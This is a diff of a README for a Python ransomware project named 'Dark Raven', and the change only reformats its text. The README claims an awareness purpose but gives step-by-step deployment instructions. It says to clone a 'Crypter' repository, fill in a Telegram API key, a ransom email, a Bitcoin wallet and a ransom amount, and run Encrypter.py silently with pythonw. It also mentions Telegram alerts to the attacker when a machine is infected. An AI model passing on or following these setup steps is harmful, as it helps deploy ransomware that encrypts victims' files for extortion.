@@ -1,4 +1,4 @@
-# RansomeWare Python Project
+# Ransomeware Python Project
 ## Dark Raven v1.5.4
 
 
@@ -31,9 +31,10 @@ The purpose of this program is to promote understanding and awareness of malware
 - Telegram API: Ransomware might integrate with the Telegram API to notify the hacker when a new computer is infected.
 
 
-## Usage:
-- Download Crypter ``` git clone https://github.com/APT3233/Crypter.git
-cd Crypter```
+- Download Crypter \
+```git clone https://github.com/APT3233/Crypter.git```
+- Move to folder \
+```cd Crypter```
 - Fill in the following information
 ```init
 self.api = 'YOUR_API'
@@ -43,10 +44,10 @@ self.ransomware_email_address = 'THANK@YOU.COM'
 self.ransomware_btc_wallet_adress = "YOUR_BTC_ADDRESS"
 self.ransomware_amount_of_money = "AMOUNT_OF_MONEY"
 ```
-```
-pip install -r requirements.txt
-pythonw Encrypter.py
-```
+- Install Modules \ 
+```pip install -r requirements.txt```
+- Run file \
+```pythonw Encrypter.py```
 
 
                                                     
